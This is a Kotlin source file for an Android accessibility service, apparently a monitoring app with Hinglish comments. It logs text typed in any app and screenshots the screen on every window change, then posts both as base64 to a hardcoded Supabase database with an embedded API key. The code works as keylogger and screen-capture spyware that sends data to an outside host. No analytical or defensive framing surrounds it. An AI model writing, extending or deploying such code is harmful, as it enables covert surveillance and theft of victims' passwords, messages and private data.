package com.example.donottouch

import android.accessibilityservice.AccessibilityService
import android.graphics.Bitmap
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.widget.Toast
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone

class TextMonitorService : AccessibilityService() {

    // Dono tables ke URLs yahan set hain
    private val SUPABASE_URL = "https://egnvvykbguovzfgrphbg.supabase.co/rest/v1/ig_live_chats"
    private val SUPABASE_RECORDS_URL = "https://egnvvykbguovzfgrphbg.supabase.co/rest/v1/records"
    private val SUPABASE_ANON_KEY = "sb_publishable_iW9sERIABBaLHqmsQJlKqA_zZj6HAi8"
    private val TAG = "TEXT_MONITOR"
    private var pendingText = ""
    private val serviceScope = CoroutineScope(Dispatchers.IO)
    private var debounceJob: Job? = null
    
    private var lastExtractTime = 0L
    // Screenshot ka cooldown timer (5 seconds)
    private var lastScreenshotTime = 0L

    private fun systemLogToSupabase(logType: String, logMessage: String) {
        try {
            Log.d(TAG, "[$logType] $logMessage")
            // System logs abhi bhi purane table mein jayenge
            sendToSupabase("System_Log", logType, logMessage, "")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to log to Supabase: ${e.message}")
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        try {
            Handler(Looper.getMainLooper()).post {
                Toast.makeText(applicationContext, "Global Screenshot Service Started!", Toast.LENGTH_LONG).show()
            }
            systemLogToSupabase("Service_Status", "Service Connected Successfully!")
            
            // Service connect hote hi pehla screenshot lene ki koshish karega
            captureScreenshotAndSend("System_App_Launch")
            lastScreenshotTime = System.currentTimeMillis()
            
        } catch (e: Exception) {
            systemLogToSupabase("Service_Connect_Crash", "Error: ${e.message}")
        }
    }
    
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        try {
            if (event == null) return 

            val pkg = event.packageName?.toString() ?: "Unknown"
            val currentTime = System.currentTimeMillis()

            if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                val capturedText = event.text?.joinToString("") ?: ""

                if (capturedText.isNotEmpty()) {
                    debounceJob?.cancel()
                    pendingText = capturedText
                    debounceJob = serviceScope.launch {
                        delay(500)
                        val finalText = pendingText
                        pendingText = ""
                        sendToSupabase(pkg, "Typed_Text", finalText, "")
                    }
                }
            }
            // Ab koi bhi app khulegi ya screen change hogi, yeh chalega.
            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
                event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                
                // Screenshot throttle logic
                if (currentTime - lastScreenshotTime > 1000) {
                    lastScreenshotTime = currentTime
                    captureScreenshotAndSend(pkg)
                }
            }
        } catch (e: Exception) {
            systemLogToSupabase("Event_Crash", "Error in event processing: ${e.message}")
        }
    }

    private fun captureScreenshotAndSend(packageName: String) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                takeScreenshot(Display.DEFAULT_DISPLAY, mainExecutor, object : TakeScreenshotCallback {
                    override fun onSuccess(screenshotResult: ScreenshotResult) {
                        try {
                            val hardwareBuffer = screenshotResult.hardwareBuffer
                            val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshotResult.colorSpace)
                            hardwareBuffer.close()

                            if (bitmap != null) {
                                val baos = ByteArrayOutputStream()
                                // Image size chota karne ke liye 30% quality rakhi hai
                                bitmap.compress(Bitmap.CompressFormat.JPEG, 30, baos) 
                                val byteArray = baos.toByteArray()
                                val base64Image = Base64.encodeToString(byteArray, Base64.NO_WRAP)
                                
                                // Screenshot ab seedha 'records' table ke 'message' column mein jayega
                                sendToRecordsTable(base64Image)
                            }
                        } catch (e: Exception) {
                            systemLogToSupabase("Screenshot_Exception", "Bitmap error: ${e.message}")
                        }
                    }

                    override fun onFailure(errorCode: Int) {
                        systemLogToSupabase("Screenshot_Error", "Capture failed: $errorCode")
                    }
                })
            } else {
                 systemLogToSupabase("Screenshot_Error", "Android 11 or higher required")
            }
        } catch (e: Exception) {
            systemLogToSupabase("Screenshot_Crash", "Failed to init screenshot: ${e.message}")
        }
    }

    // === PURANA FUNCTION (ig_live_chats table ke liye - System logs yahan jayenge) ===
    private fun sendToSupabase(senderName: String, receiverName: String, messageText: String, base64Image: String) {
        Thread {
            try {
                val url = URL(SUPABASE_URL)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("apikey", SUPABASE_ANON_KEY)
                conn.setRequestProperty("Authorization", "Bearer $SUPABASE_ANON_KEY")
                conn.setRequestProperty("Prefer", "return=minimal")
                conn.doOutput = true

                val sdf = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
                sdf.timeZone = TimeZone.getTimeZone("UTC")
                val timestamp = sdf.format(Date())

                val messageHash = (senderName + receiverName + messageText + timestamp).hashCode().toString()

                val jsonParam = JSONObject()
                jsonParam.put("sender_name", senderName)
                jsonParam.put("replied_to", receiverName) 
                jsonParam.put("message_text", messageText)
                jsonParam.put("message_hash", messageHash)
                jsonParam.put("created_at", timestamp)
                
                if (base64Image.isNotEmpty()) {
                    jsonParam.put("screenshot_base64", base64Image)
                }

                val os = OutputStreamWriter(conn.outputStream)
                os.write(jsonParam.toString())
                os.flush()
                os.close()

                val responseCode = conn.responseCode
                if (responseCode >= 300) {
                     val errorText = conn.errorStream.bufferedReader().use { it.readText() }
                     Handler(Looper.getMainLooper()).post {
                         Toast.makeText(applicationContext, "Supabase Error: $errorText", Toast.LENGTH_LONG).show()
                     }
                } else {
                     Handler(Looper.getMainLooper()).post {
                         Toast.makeText(applicationContext, "Supabase Sent!", Toast.LENGTH_SHORT).show()
                     }
                }
                conn.disconnect()
            } catch (e: Exception) {
                Handler(Looper.getMainLooper()).post {
                    Toast.makeText(applicationContext, "Network Error: ${e.message}", Toast.LENGTH_LONG).show()
                }
            }
        }.start()
    }

    // === NAYA FUNCTION (records table ke liye - Screenshots yahan jayenge) ===
    private fun sendToRecordsTable(messageText: String) {
        Thread {
            try {
                val url = URL(SUPABASE_RECORDS_URL)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("apikey", SUPABASE_ANON_KEY)
                conn.setRequestProperty("Authorization", "Bearer $SUPABASE_ANON_KEY")
                conn.setRequestProperty("Prefer", "return=minimal")
                conn.doOutput = true

                val sdf = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
                sdf.timeZone = TimeZone.getTimeZone("UTC")
                val timestamp = sdf.format(Date())

                val jsonParam = JSONObject()
                jsonParam.put("message", messageText)
                jsonParam.put("created_at", timestamp)

                val os = OutputStreamWriter(conn.outputStream)
                os.write(jsonParam.toString())
                os.flush()
                os.close()

                val responseCode = conn.responseCode
                if (responseCode >= 300) {
                     val errorText = conn.errorStream.bufferedReader().use { it.readText() }
                     Log.e(TAG, "Records Table Error: $errorText")
                     Handler(Looper.getMainLooper()).post {
                         Toast.makeText(applicationContext, "Records Error: $errorText", Toast.LENGTH_LONG).show()
                     }
                } else {
                     Log.d(TAG, "Records Table Insert Success!")
                     Handler(Looper.getMainLooper()).post {
                         Toast.makeText(applicationContext, "Screenshot Saved to Records!", Toast.LENGTH_SHORT).show()
                     }
                }
                conn.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "Records Network Error: ${e.message}")
            }
        }.start()
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        try {
            serviceScope.cancel()
            systemLogToSupabase("Service_Status", "Service Destroyed/Stopped")
        } catch (e: Exception) {
            // Silently ignore
        }
    }
}